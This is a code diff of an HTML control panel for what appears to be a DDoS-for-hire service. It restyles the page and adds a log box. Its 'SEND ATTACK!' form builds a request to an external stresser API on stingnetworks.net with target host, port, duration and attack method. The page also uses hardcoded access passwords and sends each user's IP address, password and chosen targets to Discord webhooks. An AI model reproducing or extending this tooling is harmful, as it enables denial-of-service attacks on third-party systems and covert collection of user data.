@@ -69,25 +69,16 @@
             background-color: #1A1A1A;
         }
 
-        /* Snowfall Animation */
-        .snowflake {
-            position: absolute;
-            top: -10px;
+        /* Output Box */
+        #outputBox {
+            width: 100%;
+            height: 200px;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #1A1A1A;
             color: #FFFFFF;
-            font-size: 1em;
-            opacity: 0.8;
-            animation: fall linear infinite;
-        }
-        /* Keyframes for Snowfall */
-        @keyframes fall {
-            0% {
-                transform: translateY(0) translateX(0);
-                opacity: 0.8;
-            }
-            100% {
-                transform: translateY(100vh) translateX(10vw);
-                opacity: 0.1;
-            }
+            overflow-y: auto;
+            border: 1px solid #666666;
         }
     </style>
 </head>
@@ -117,24 +108,13 @@
         <button type="button" onclick="openRequest()">SEND ATTACK!</button>
     </form>
 
+    <!-- Output Box for logging information -->
+    <div id="outputBox"></div>
+
     <!-- Display Website in iFrame -->
     <iframe id="urlFrame" src=""></iframe>
 
-    <!-- Snowfall Effect Elements -->
     <script>
-        // Snowfall Effect
-        function createSnowflake() {
-            const snowflake = document.createElement("div");
-            snowflake.classList.add("snowflake");
-            snowflake.textContent = "❄";
-            snowflake.style.left = Math.random() * 100 + "vw";
-            snowflake.style.animationDuration = Math.random() * 3 + 2 + "s";
-            snowflake.style.fontSize = Math.random() * 10 + 10 + "px";
-            document.body.appendChild(snowflake);
-            setTimeout(() => { snowflake.remove(); }, 5000);
-        }
-        setInterval(createSnowflake, 200);
-
         // Allowed Passwords
         const allowedPasswords = ["CookieG.O.A.T", "AlphaG.O.A.T", "PublicG.O.A.T", "SatyaG.O.A.T"];
         let token = "";
@@ -150,7 +130,7 @@
             return data.ip;
         }
 
-        // Send data to Discord Webhook
+        // Send data to Discord Webhook with JSON format
         async function sendToDiscord(webhookUrl, jsonData) {
             await fetch(webhookUrl, {
                 method: "POST",
@@ -169,29 +149,29 @@
             if (allowedPasswords.includes(password)) {
                 document.getElementById("loginPopup").style.display = "none";
 
-                // Log IP and time to Discord
                 const userIP = await getUserIP();
                 const time = new Date().toLocaleString();
 
-                // Prepare JSON data
-                const loginMessage = {
-                    content: null,
-                    embeds: [
+                // JSON format for login log
+                const loginLog = {
+                    "content": null,
+                    "embeds": [
                         {
-                            title: "NEW LOGIN LOG",
-                            description: `\`💀\` ➡ \`${userIP}\`\n\`🦴\` ➡ \`${password}\`\n\`🐱‍🏍\` ➡ \`${time}\``,
-                            color: 4718336,
-                            image: {
-                                url: "https://steamuserimages-a.akamaihd.net/ugc/244710630325715238/DBF2154CE721814E9B0F8C6B14D1578A92A3F7B1/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false"
+                            "title": "NEW LOGIN LOG",
+                            "description": "`💀` ➡ ``" + userIP + "``\n`🦴` ➡ ``" + password + "``\n`🐱‍🏍` ➡ ``" + time + "``",
+                            "color": 4718336,
+                            "image": {
+                                "url": "https://steamuserimages-a.akamaihd.net/ugc/244710630325715238/DBF2154CE721814E9B0F8C6B14D1578A92A3F7B1/?imw=5000&imh=5000&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=false"
                             },
-                            thumbnail: {
-                                url: "https://i.gifer.com/81RA.gif"
+                            "thumbnail": {
+                                "url": "https://i.gifer.com/81RA.gif"
                             }
                         }
                     ],
-                    attachments: []
+                    "attachments": []
                 };
-                await sendToDiscord(loginWebhookUrl, loginMessage);
+                
+                await sendToDiscord(loginWebhookUrl, loginLog);
 
             } else {
                 alert("Invalid Password!");
@@ -205,24 +185,30 @@
             const time = document.getElementById('time').value;
             const method = document.getElementById('method').value;
 
-            // Build the API URL and update iFrame
+            const userIP = await getUserIP();
+
+            // Log information to the output box
+            const outputBox = document.getElementById('outputBox');
+            outputBox.innerText = `DDoS Attempt - IP: ${userIP}, Host: ${host}, Port: ${port}, Method: ${method}, Time: ${new Date().toLocaleString()}`;
+
+            // Send request to iframe
             const apiUrl = `http://stingnetworks.net//?token=${token}&host=${host}&port=${port}&time=${time}&method=${method}`;
             document.getElementById('urlFrame').src = apiUrl;
 
-            // Log DDoS attempt to Discord
-            const userIP = await getUserIP();
-            const attackMessage = {
-                content: null,
-                embeds: [
+            // JSON format for attack log
+            const attackLog = {
+                "content": null,
+                "embeds": [
                     {
-                        title: "DDoS ATTEMPT LOG",
-                        description: `\`💻\` ➡ \`${userIP}\`\n\`🔑\` ➡ \`${document.getElementById("loginPassword").value}\`\n\`⏱️\` ➡ \`${new Date().toLocaleString()}\`\n\`🌐\` ➡ \`${host}\`\n\`📍\` ➡ \`${port}\`\n\`🚀\` ➡ \`${method}\``,
-                        color: 16711680, // Red color
+                        "title": "NEW ATTACK LOG",
+                        "description": "`💥` ➡ ``" + userIP + "``\n`📍` ➡ ``" + host + ":" + port + "``\n`🕒` ➡ ``" + time + "s``\n`🔧` ➡ ``" + method + "``",
+                        "color": 16711680
                     }
                 ],
-                attachments: []
+                "attachments": []
             };
-            await sendToDiscord(ddosWebhookUrl, attackMessage);
+
+            await sendToDiscord(ddosWebhookUrl, attackLog);
         }
     </script>
 </body>
